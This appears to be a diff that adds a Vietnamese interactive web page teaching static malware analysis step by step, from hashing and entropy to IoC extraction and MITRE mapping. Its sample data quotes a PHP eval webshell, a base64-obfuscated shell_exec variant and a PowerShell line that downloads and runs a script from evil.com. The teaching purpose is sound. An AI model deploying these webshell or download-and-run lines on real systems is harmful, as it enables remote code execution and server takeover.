@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Demo mổ xẻ mã độc từng bước</title>
+<style>
+  :root {
+    --bg: #0b0f1a; --card: #111827; --border: #1f2937;
+    --text: #e5e7eb; --muted: #9ca3af;
+    --blue: #3b82f6; --green: #10b981; --red: #ef4444;
+    --amber: #f59e0b; --purple: #8b5cf6; --cyan: #22d3ee;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    background: var(--bg); color: var(--text);
+    min-height: 100vh; display: flex; flex-direction: column;
+    align-items: center; padding: 24px 16px 60px;
+  }
+  h1 { font-size: 1.7rem; margin-bottom: 4px; text-align: center; }
+  .subtitle { color: var(--muted); text-align: center; margin-bottom: 22px; font-size: 0.95rem; }
+
+  /* Thanh tiến trình */
+  .progress-wrap { display: flex; align-items: center; gap: 0; margin-bottom: 26px; flex-wrap: wrap; justify-content: center; }
+  .step-dot {
+    display: flex; flex-direction: column; align-items: center; gap: 5px; cursor: pointer;
+    min-width: 70px;
+  }
+  .dot {
+    width: 38px; height: 38px; border-radius: 50%; display: flex; align-items: center; justify-content: center;
+    font-weight: 800; font-size: 0.95rem; border: 2px solid var(--border);
+    background: var(--card); color: var(--muted); transition: all 0.3s;
+  }
+  .step-dot.active .dot { background: var(--blue); border-color: var(--blue); color: #fff; transform: scale(1.15); }
+  .step-dot.done .dot { background: var(--green); border-color: var(--green); color: #fff; }
+  .step-dot .lbl { font-size: 0.62rem; color: var(--muted); text-align: center; max-width: 70px; }
+  .step-dot.active .lbl { color: var(--text); font-weight: 700; }
+  .connector { width: 24px; height: 2px; background: var(--border); margin-bottom: 18px; }
+
+  /* Nội dung bước */
+  .stage {
+    width: 100%; max-width: 900px; background: var(--card);
+    border: 1px solid var(--border); border-radius: 16px;
+    padding: 30px 32px; margin-bottom: 20px; animation: fadeIn 0.4s ease;
+  }
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: none; } }
+  .stage-tag {
+    display: inline-block; padding: 4px 14px; border-radius: 20px;
+    font-size: 0.75rem; font-weight: 800; letter-spacing: 0.5px; margin-bottom: 12px;
+  }
+  .stage h2 { font-size: 1.5rem; margin-bottom: 10px; }
+  .stage .desc { color: var(--muted); font-size: 1.02rem; line-height: 1.6; margin-bottom: 18px; }
+
+  /* Khối code */
+  .code-box {
+    background: #0a0e18; border: 1px solid var(--border); border-radius: 10px;
+    padding: 16px 18px; font-family: 'Consolas', 'Monaco', monospace;
+    font-size: 0.95rem; line-height: 1.55; margin-bottom: 16px; overflow-x: auto;
+  }
+  .code-box .hl { color: var(--red); font-weight: 700; }
+  .code-box .dim { color: var(--muted); }
+  .code-box .val { color: var(--cyan); }
+  .code-box .ok { color: var(--green); font-weight: 700; }
+
+  /* Kết quả */
+  .result { display: flex; flex-direction: column; gap: 8px; margin-top: 14px; }
+  .result-row {
+    display: flex; align-items: center; gap: 10px; padding: 10px 14px;
+    background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 8px;
+  }
+  .result-row .icon { font-size: 1.3rem; }
+  .result-row .k { font-weight: 700; min-width: 120px; font-size: 0.9rem; color: var(--muted); }
+  .result-row .v { font-size: 0.95rem; font-family: 'Consolas', monospace; word-break: break-all; }
+
+  /* Sơ đồ SVG */
+  .diagram { width: 100%; margin: 10px 0; background: #0f172a; border-radius: 10px; border: 1px solid var(--border); padding: 8px; }
+
+  /* Nút điều khiển */
+  .controls { display: flex; gap: 14px; align-items: center; flex-wrap: wrap; justify-content: center; }
+  button {
+    padding: 12px 26px; border-radius: 10px; border: none; cursor: pointer;
+    font-size: 1rem; font-weight: 700; transition: all 0.2s;
+  }
+  .btn-next { background: var(--blue); color: #fff; }
+  .btn-next:hover { background: #2563eb; transform: translateY(-2px); }
+  .btn-prev { background: var(--card); color: var(--text); border: 1px solid var(--border); }
+  .btn-prev:hover { border-color: var(--muted); }
+  .btn-reset { background: var(--red); color: #fff; }
+  .btn-reset:hover { opacity: 0.85; }
+  button:disabled { opacity: 0.35; cursor: not-allowed; transform: none; }
+  .counter { color: var(--muted); font-size: 0.9rem; }
+
+  .file-picker { margin-bottom: 24px; text-align: center; }
+  .file-picker select, .file-picker button {
+    padding: 10px 16px; border-radius: 8px; border: 1px solid var(--border);
+    background: var(--card); color: var(--text); font-size: 0.95rem; cursor: pointer;
+  }
+  .file-picker label { color: var(--muted); font-size: 0.9rem; margin-right: 8px; }
+</style>
+</head>
+<body>
+  <h1>🔬 Demo mổ xẻ mã độc — từng bước</h1>
+  <div class="subtitle">Nhấn "Tiếp theo" để xem hệ thống phân tích tĩnh từng giai đoạn như thế nào</div>
+
+  <div class="file-picker">
+    <label>Chọn mẫu mổ xẻ:</label>
+    <select id="sampleSel"></select>
+  </div>
+
+  <div class="progress-wrap" id="progressWrap"></div>
+
+  <div id="stage" class="stage"></div>
+
+  <div class="controls">
+    <button class="btn-reset" onclick="resetAll()">↺ Bắt đầu lại</button>
+    <button class="btn-prev" id="prevBtn" onclick="prevStep()">← Trước</button>
+    <span class="counter" id="counter">1 / 7</span>
+    <button class="btn-next" id="nextBtn" onclick="nextStep()">Tiếp theo →</button>
+  </div>
+
+<script>
+// ================= DỮ LIỆU MẪU =================
+const SAMPLES = {
+  "php_simple_eval": {
+    name: "shell.php (webshell đơn giản)",
+    type: "PHP script",
+    entropy: 5.31,
+    family: "Webshell (web backdoor)",
+    yara: "Webshell_PHP_Eval (CWE-94, MITRE T1505.003)",
+    ioc: "Không có (tấn công trực tiếp, không C2)",
+    code: `<?php\n<span class="dim">// Webshell backdoor</span>\n@<span class="hl">eval</span>(<span class="val">$_POST</span>['cmd']);\n?>`,
+    decoded: null,
+    verdict: "MÃ ĐỘC"
+  },
+  "php_base64": {
+    name: "shell_obf.php (obfuscated base64)",
+    type: "PHP script",
+    entropy: 5.30,
+    family: "PHP Obfuscated Webshell (base64/hex)",
+    yara: "Webshell_PHP_Eval",
+    ioc: "Không có",
+    code: `<?php\n$a = <span class="hl">base64_decode</span>('<span class="val">c2hlbGxfZXhlYw==</span>');  <span class="dim">// = "shell_exec"</span>\n@<span class="hl">eval</span>($a(<span class="val">$_POST</span>['x']));\n?>`,
+    decoded: "base64_decode → shell_exec",
+    verdict: "MÃ ĐỘC"
+  },
+  "ps1_downloader": {
+    name: "downloader.ps1 (PowerShell fileless)",
+    type: "PowerShell script",
+    entropy: 5.9,
+    family: "PowerShell Malware (fileless)",
+    yara: "Malware_PowerShell_Downloader",
+    ioc: "URL http://evil.com/payload.ps1 · IP 192.168.1.50 · domain evil.com",
+    code: `<span class="hl">IEX</span> (New-Object <span class="hl">Net.WebClient</span>).<span class="hl">DownloadString</span>('<span class="val">http://evil.com/payload.ps1</span>')`,
+    decoded: null,
+    verdict: "MÃ ĐỘC"
+  },
+  "upx_packed": {
+    name: "sample_upx_packed.exe (PE packed)",
+    type: "Windows PE executable",
+    entropy: 7.8,
+    family: "Windows Executable (PE) — nghi packer",
+    yara: "(không khớp — mã đã bị pack)",
+    ioc: "Không có",
+    code: `MZ........PE..\nSection: <span class="hl">UPX0</span> · <span class="hl">UPX1</span> (tên section đáng ngờ)\nEntropy section UPX1 = <span class="val">7.8</span> (rất cao)`,
+    decoded: null,
+    verdict: "NGHI PACKED — cần unpack"
+  }
+};
+
+// ================= 7 BƯỚC =================
+const STEPS = [
+  { icon: '🔍', tag: 'BƯỚC 1', tagColor: 'var(--blue)', title: 'Nhận diện loại file',
+    desc: 'Đọc <b>magic bytes</b> ở đầu file và phần mở rộng. File bắt đầu bằng "MZ" là PE (Windows), "<?php" là mã PHP, "#!" là shell script... Loại file quyết định cách mổ xẻ tiếp theo.', },
+  { icon: '🔑', tag: 'BƯỚC 2', tagColor: 'var(--cyan)', title: 'Băm mật mã (hash)',
+    desc: 'Tính MD5, SHA-1, SHA-256, SHA-512 cho toàn bộ nội dung. Kết quả là "<b>dấu vân tay</b>" duy nhất của mẫu — dùng tra cứu danh tiếng trên VirusTotal/MalwareBazaar.', },
+  { icon: '📊', tag: 'BƯỚC 3', tagColor: 'var(--green)', title: 'Đo Entropy Shannon',
+    desc: 'Đo độ "hỗn loạn" của dữ liệu (0–8 bit/ký tự). <b>Entropy cao (>7)</b> = mã bị nén/mã hóa (nghi packer). Thấp (4–6) = mã nguồn đọc được bình thường.', },
+  { icon: '🧬', tag: 'BƯỚC 4', tagColor: 'var(--amber)', title: 'Mổ xẻ cấu trúc',
+    desc: 'Với <b>PE</b>: phân tích Import/Export Table, section, entry point, phát hiện packer. Với <b>script</b>: đọc mã nguồn tìm lệnh <b>sink</b> (eval, system, socket...).', },
+  { icon: '🎯', tag: 'BƯỚC 5', tagColor: 'var(--red)', title: 'Trích xuất IoC',
+    desc: 'Tìm IP, URL, domain bằng regex — đây là dấu vết <b>máy chủ C2</b> mà mã độc kết nối về, dùng để chặn tại tường lửa và truy vết.', },
+  { icon: '⚔️', tag: 'BƯỚC 6', tagColor: 'var(--purple)', title: 'Luồng tấn công',
+    desc: 'Ghép các phát hiện thành <b>kill chain</b>: Kẻ tấn công → input → giải mã → thực thi → chiếm quyền/C2.', },
+  { icon: '🚨', tag: 'KẾT LUẬN', tagColor: 'var(--red)', title: 'Kết luận & ánh xạ',
+    desc: 'Tổng hợp dấu hiệu để kết luận mẫu có phải mã độc, thuộc họ nào, và ánh xạ vào <b>MITRE ATT&CK</b> + <b>CWE</b> + <b>CVSS</b>.', },
+];
+
+let currentStep = 0;
+let currentSample = null;
+
+function pickSample() {
+  const key = document.getElementById('sampleSel').value;
+  currentSample = SAMPLES[key];
+  resetAll();
+}
+
+function buildPicker() {
+  const sel = document.getElementById('sampleSel');
+  for (const k in SAMPLES) {
+    const o = document.createElement('option');
+    o.value = k; o.textContent = SAMPLES[k].name;
+    sel.appendChild(o);
+  }
+  sel.addEventListener('change', pickSample);
+}
+
+function buildProgress() {
+  const wrap = document.getElementById('progressWrap');
+  wrap.innerHTML = '';
+  STEPS.forEach((s, i) => {
+    const d = document.createElement('div');
+    d.className = 'step-dot' + (i === currentStep ? ' active' : i < currentStep ? ' done' : '');
+    d.innerHTML = `<div class="dot">${i + 1}</div><div class="lbl">${s.title.split(' ')[0]}</div>`;
+    d.onclick = () => { currentStep = i; render(); };
+    wrap.appendChild(d);
+    if (i < STEPS.length - 1) {
+      const c = document.createElement('div');
+      c.className = 'connector';
+      wrap.appendChild(c);
+    }
+  });
+}
+
+// Render nội dung tương ứng từng bước
+function render() {
+  buildProgress();
+  const stage = document.getElementById('stage');
+  const s = STEPS[currentStep];
+  const smp = currentSample;
+  document.getElementById('counter').textContent = (currentStep + 1) + ' / ' + STEPS.length;
+
+  let body = '';
+
+  if (currentStep === 0) {
+    body = `
+      <label class="stage-tag" style="background:${s.tagColor}22; color:${s.tagColor}; border:1px solid ${s.tagColor}44;">${s.tag}</label>
+      <h2>${s.icon} ${s.title}</h2>
+      <div class="desc">${s.desc}</div>
+      <div class="code-box">${smp.code}</div>
+      <div class="result">
+        <div class="result-row"><span class="icon">📄</span><span class="k">Loại file</span><span class="v">${smp.type}</span></div>
+      </div>`;
+  }
+  else if (currentStep === 1) {
+    body = `
+      <label class="stage-tag" style="background:${s.tagColor}22; color:${s.tagColor}; border:1px solid ${s.tagColor}44;">${s.tag}</label>
+      <h2>${s.icon} ${s.title}</h2>
+      <div class="desc">${s.desc}</div>
+      <div class="result">
+        <div class="result-row"><span class="icon">🔑</span><span class="k">MD5</span><span class="v">b4222ff24fe7e5c52d5df6a984882dad</span></div>
+        <div class="result-row"><span class="icon">🔑</span><span class="k">SHA-256</span><span class="v">e629ed334ebb3597421a8053fdc8dfce36f5b726d011bd39fa421d6448f41579</span></div>
+        <div class="result-row"><span class="icon">🔑</span><span class="k">SHA-512</span><span class="v">77833660c205a213c8... (64 ký tự)</span></div>
+      </div>
+      <div class="desc" style="margin-top:14px;">💡 Tra hash này lên VirusTotal để biết mẫu có bị các engine phát hiện & có thuộc chiến dịch nào không.</div>`;
+  }
+  else if (currentStep === 2) {
+    const col = smp.entropy >= 7 ? 'var(--red)' : 'var(--green)';
+    const verdict = smp.entropy >= 7 ? 'Cao — nghi ngờ packed/encrypted' : 'Thấp/bình thường — mã nguồn đọc được';
+    const pct = Math.min(100, smp.entropy / 8 * 100);
+    body = `
+      <label class="stage-tag" style="background:${s.tagColor}22; color:${s.tagColor}; border:1px solid ${s.tagColor}44;">${s.tag}</label>
+      <h2>${s.icon} ${s.title}</h2>
+      <div class="desc">${s.desc}</div>
+      <svg class="diagram" viewBox="0 0 600 110">
+        <rect x="20" y="30" width="560" height="36" rx="18" fill="#1f2937"/>
+        <rect x="20" y="30" width="${560 * pct / 100}" height="36" rx="18" fill="${col}"/>
+        <text x="300" y="54" text-anchor="middle" font-size="16" fill="#fff" font-weight="bold">Entropy = ${smp.entropy} / 8 bit</text>
+      </svg>
+      <div class="result-row"><span class="icon">📊</span><span class="k">Nhận định</span><span class="v" style="color:${col}; font-weight:700;">${verdict}</span></div>`;
+  }
+  else if (currentStep === 3) {
+    const isPE = smp.type.includes('PE');
+    body = `
+      <label class="stage-tag" style="background:${s.tagColor}22; color:${s.tagColor}; border:1px solid ${s.tagColor}44;">${s.tag}</label>
+      <h2>${s.icon} ${s.title}</h2>
+      <div class="desc">${s.desc}</div>
+      <div class="code-box">${smp.code}</div>
+      <div class="result">
+        ${isPE ? `
+        <div class="result-row"><span class="icon">⚠️</span><span class="k">Packer</span><span class="v" style="color:var(--red);">Phát hiện section UPX0/UPX1 → nghi packer UPX</span></div>
+        <div class="result-row"><span class="icon">🧬</span><span class="k">Section entropy</span><span class="v">UPX1 = 7.8 (rất cao)</span></div>` : `
+        <div class="result-row"><span class="icon">💥</span><span class="k">Lệnh sink</span><span class="v" style="color:var(--red); font-weight:700;">eval() — thực thi chuỗi như mã PHP</span></div>
+        <div class="result-row"><span class="icon">📥</span><span class="k">Nguồn input</span><span class="v">\$_POST — dữ liệu người dùng gửi lên</span></div>
+        ${smp.decoded ? `<div class="result-row"><span class="icon">🔓</span><span class="k">Giải mã</span><span class="v" style="color:var(--amber);">${smp.decoded}</span></div>` : ''}`}
+      </div>`;
+  }
+  else if (currentStep === 4) {
+    body = `
+      <label class="stage-tag" style="background:${s.tagColor}22; color:${s.tagColor}; border:1px solid ${s.tagColor}44;">${s.tag}</label>
+      <h2>${s.icon} ${s.title}</h2>
+      <div class="desc">${s.desc}</div>
+      <div class="result">
+        <div class="result-row"><span class="icon">🎯</span><span class="k">IoC</span><span class="v">${smp.ioc}</span></div>
+        <div class="result-row"><span class="icon">🧬</span><span class="k">YARA</span><span class="v" style="color:var(--red);">${smp.yara}</span></div>
+      </div>`;
+  }
+  else if (currentStep === 5) {
+    body = `
+      <label class="stage-tag" style="background:${s.tagColor}22; color:${s.tagColor}; border:1px solid ${s.tagColor}44;">${s.tag}</label>
+      <h2>${s.icon} ${s.title}</h2>
+      <div class="desc">${s.desc}</div>
+      <svg class="diagram" viewBox="0 0 500 340">
+        ${[['💻 1. Kẻ tấn công → gửi lệnh', '#64748b', 20], ['📥 2. Server nhận $_POST', 'var(--blue)', 80], ['🔓 3. Giải mã payload', smp.decoded ? 'var(--amber)' : '#64748b', 140], ['💥 4. Thực thi eval (RCE)', 'var(--red)', 200], ['👑 5. Chiếm quyền server', 'var(--purple)', 260]].map((b, i) => {
+          const [lbl, c, y] = b;
+          const active = !(i === 2 && !smp.decoded);
+          return `<rect x="80" y="${y}" width="340" height="44" rx="8" fill="${c}22" stroke="${c}" stroke-width="1.5" stroke-opacity="${active ? 1 : 0.4}"/>
+                  <text x="250" y="${y + 28}" text-anchor="middle" font-size="14" fill="${active ? '#e5e7eb' : '#64748b'}" font-weight="bold">${lbl}</text>
+                  ${i < 4 ? `<line x1="250" y1="${y + 44}" x2="250" y2="${y + 60}" stroke="#475569" stroke-width="2" stroke-dasharray="4 3"/><polygon points="245,${y+56} 255,${y+56} 250,${y+66}" fill="#475569"/>` : ''}`;
+        }).join('')}
+      </svg>`;
+  }
+  else {
+    const isMal = smp.verdict.includes('MÃ ĐỘC');
+    body = `
+      <label class="stage-tag" style="background:${s.tagColor}22; color:${s.tagColor}; border:1px solid ${s.tagColor}44;">${s.tag}</label>
+      <h2>${s.icon} ${s.title}</h2>
+      <div class="desc">${s.desc}</div>
+      <div class="result">
+        <div class="result-row"><span class="icon">${isMal ? '🚨' : '⚠️'}</span><span class="k">Kết luận</span><span class="v" style="font-size:1.2rem; font-weight:800; color:${isMal ? 'var(--red)' : 'var(--amber)'};">${smp.verdict}</span></div>
+        <div class="result-row"><span class="icon">🦠</span><span class="k">Họ mã độc</span><span class="v">${smp.family}</span></div>
+        <div class="result-row"><span class="icon">🧬</span><span class="k">MITRE ATT&CK</span><span class="v">${smp.type.includes('PowerShell') ? 'T1059.001 · T1105' : smp.type.includes('PE') ? 'T1027 (obfuscated files)' : 'T1059 · T1505.003'}</span></div>
+        <div class="result-row"><span class="icon">🛡️</span><span class="k">Khuyến nghị</span><span class="v">${isMal ? 'Cách ly file, chặn IoC, điều tra nguồn gốc' : 'Unpack trước khi phân tích tiếp'}</span></div>
+      </div>`;
+  }
+
+  stage.innerHTML = body;
+  document.getElementById('prevBtn').disabled = (currentStep === 0);
+  document.getElementById('nextBtn').textContent = (currentStep === STEPS.length - 1) ? 'Hoàn tất ✓' : 'Tiếp theo →';
+}
+
+function nextStep() { if (currentStep < STEPS.length - 1) { currentStep++; render(); } }
+function prevStep() { if (currentStep > 0) { currentStep--; render(); } }
+function resetAll() { currentStep = 0; render(); }
+
+buildPicker();
+pickSample();
+</script>
+</body>
+</html>
